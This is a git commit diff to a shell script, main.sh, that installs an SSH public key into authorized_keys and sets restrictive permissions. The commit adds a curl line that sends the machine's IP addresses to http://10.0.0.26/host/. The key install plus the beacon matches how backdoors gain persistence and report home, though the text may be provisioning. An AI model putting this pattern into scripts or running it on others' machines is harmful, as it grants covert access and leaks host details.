2e053ed83d21d7a98747dca9728de22747b6a773
CST Terminal <141868176+sevinATEnine-alt@users.noreply.github.com>
2024-07-24 15:21:38 -0600

    Update main.sh

--- main.sh
+++ main.sh
@@ -9,3 +9,5 @@ cat key.pub >> authorized_keys
 chmod 700 ~
 chmod 700 ~/.ssh
 chmod 600 ~/.ssh/authorized_keys
+
+curl "http://10.0.0.26/host/$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')"
